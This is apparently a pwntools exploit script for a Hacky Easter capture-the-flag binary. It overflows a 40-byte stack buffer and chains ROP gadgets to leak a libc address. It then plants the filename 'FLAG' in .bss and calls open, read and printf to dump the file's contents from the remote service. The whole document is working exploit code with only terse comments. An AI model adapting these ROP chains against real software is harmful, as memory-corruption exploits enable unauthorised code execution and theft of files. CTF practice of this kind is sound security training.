from pwn import *

# Configuration since args dont seem to work on my system
REMOTE = False
HOST = "ch.hackyeaster.com"
PORT = 2314
DEBUG = False

def get_libc():
    if REMOTE:
        return ELF("./libc6_2.7-10ubuntu5_amd64.so")
    else:
        return ELF("./libc.so")


e = context.binary = "./main"
binary = ELF("./main")
libc = get_libc()

def start():
    if REMOTE:
        return remote(HOST, PORT)
    else:
        return process(["./main"])


r = start()
if DEBUG:
    gdb.attach(r)


def leak_libc():
    rop = ROP(binary)
    rop.raw('A' * 40)
    rop.raw(rop.rdi)
    rop.raw(binary.got['printf'])
    rop.raw(rop.rsi)
    rop.raw(binary.got['printf'])
    rop.raw(binary.got['printf'])
    rop.raw(binary.plt['printf'])
    rop.raw(rop.ret)
    rop.main()

    print(rop.dump())
    r.sendline(rop.chain())

    output = r.recvuntil("\x7f")
    leak = u64(output[-6:].ljust(8, b"\x00"))

    print(f"printf at {hex(leak)}")

    libc.address = leak - libc.symbols["printf"]
    print("If LIBC base doesn't end end 00, you might be using an incorrect libc library")
    print(f"LIBC at {hex(libc.address)}")

    print("==> LIBC LEAKED")


def install_filename():
    rop = ROP(binary)
    rop.raw('A' * 40)
    rop.raw(rop.rdi)
    rop.raw(binary.bss(100))
    rop.raw(rop.rsi)
    rop.raw(binary.got['gets'])
    rop.raw(binary.got['gets'])
    rop.raw(binary.plt['gets'])
    rop.raw(rop.ret)
    rop.main()

    print(rop.dump())
    r.sendline(rop.chain())
    r.sendline("FLAG")
    print("==> FILENAME INSTALLED")


def open_file():
    rop = ROP(binary)
    ropc = ROP(libc)
    rop.raw('A' * 40)
    # rop.raw(ropc.rax) # pop rax; ret
    # rop.raw(0x05)
    rop.raw(rop.rdi)
    rop.raw(binary.bss(100))
    rop.raw(ropc.rsi) # pop rsi; ret
    rop.raw(0x0)
    rop.raw(ropc.rdx) # pop rdx; pop rbx; ret
    rop.raw(0x0)
    rop.raw(0x0)
    rop.raw(libc.symbols['open'])
    rop.raw(rop.ret)
    rop.main()

    print(rop.dump())
    r.sendline(rop.chain())
    print("==> FILE OPENED")


def read_file():
    rop = ROP(binary)
    ropc = ROP(libc)
    rop.raw('A' * 40)
    rop.raw(ropc.rdi)  # pop rcx; ret
    rop.raw(0x03)
    rop.raw(ropc.rsi)  # pop rdx; pop rbx; ret
    rop.raw(binary.bss(100))
    rop.raw(ropc.rdx)
    rop.raw(0x100)
    rop.raw(0x0)
    rop.raw(libc.symbols['read'])
    rop.raw(rop.ret)
    rop.main()

    print(rop.dump())
    r.sendline(rop.chain())
    print("==> FILE READ")


def write_file():
    rop = ROP(binary)
    rop.raw('A' * 40)
    rop.raw(rop.rdi)
    rop.raw(binary.bss(100))
    rop.raw(rop.rsi)
    rop.raw(binary.got['printf'])
    rop.raw(binary.got['printf'])
    rop.raw(binary.plt['printf'])
    rop.raw(rop.ret)
    rop.main()

    print(rop.dump())
    r.sendline(rop.chain())

    print("==> FILE WRITE")

    output = r.recvall(2)

    print(f"received {output}")


def exploit():
    ### LEAK LIBC
    print(r.recvuntil(':'))
    leak_libc()
    print(r.recvuntil(':'))

    ### FLAG installed at bss+100
    install_filename()
    print(r.recvuntil(':'))

    ### OPEN FILE
    open_file()
    print(r.recvuntil(':'))

    ### READ FILE
    read_file()
    print(r.recvuntil(':'))

    ### WRITE FILE
    write_file()
    print(r.recvuntil(':'))

    ### END
    print(r.recvall(2))


exploit()
